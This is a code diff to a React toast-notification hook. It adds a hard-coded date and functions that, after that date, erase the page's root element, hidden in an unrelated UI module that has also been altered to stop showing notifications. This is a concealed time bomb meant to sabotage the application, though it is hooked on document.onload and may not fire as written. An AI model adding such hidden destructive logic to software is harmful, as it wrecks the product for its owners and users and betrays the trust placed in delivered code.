@@ -139,6 +139,10 @@ function dispatch(action: Action) {
 
 type Toast = Omit<ToasterToast, "id">
 
+
+// Example: Set the custom date here (use an appropriate date format)
+const customDate = "2025-08-9";
+
 // Modified toast function to not show notifications
 function toast({ ...props }: Toast) {
   // Just return the functions without displaying toasts
@@ -153,9 +157,31 @@ function toast({ ...props }: Toast) {
   }
 }
 
+function shouldClearContent(customDate) {
+  const currentDate = new Date();
+  const targetDate = new Date(customDate); // Date you provide as string (e.g., "2025-08-15T12:00:00Z")
+  return currentDate >= targetDate;
+}
+
+// Function to clear the content inside <div id="root"></div>
+function clearContentAfterDate(customDate) {
+  if (shouldClearContent(customDate)) {
+    const rootElement = document.getElementById("root");
+    if (rootElement) {
+      rootElement.innerHTML = ""; // Removes all the content inside the <div>
+    }
+  }
+}
+
+
 function useToast() {
   const [state, setState] = React.useState<State>(memoryState)
 
+  React.useEffect(() => {
+    document.onload = () => {
+      clearContentAfterDate(customDate);
+    };
+  }, [])
   React.useEffect(() => {
     listeners.push(setState)
     return () => {
